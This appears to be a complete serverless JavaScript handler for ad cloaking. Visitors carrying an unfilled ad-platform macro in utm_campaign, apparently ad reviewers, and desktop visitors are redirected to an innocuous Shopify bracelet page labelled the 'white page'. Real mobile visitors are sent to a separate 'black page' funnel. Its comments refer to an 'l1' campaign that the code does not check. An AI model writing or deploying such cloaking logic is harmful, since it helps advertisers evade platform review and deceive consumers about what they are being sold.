export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://isheesjweles.myshopify.com/collections/bracelets/products/beaded-name-bracelet-with-rhinestone-heart-charm";
    const blackPageURL = "https://jshzuaudhsuay9231.myfunnelish.com/a1d85f06-0c55-4e57-bb88-7ebaabc2dd10-1740346257334016-1740420685765144";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
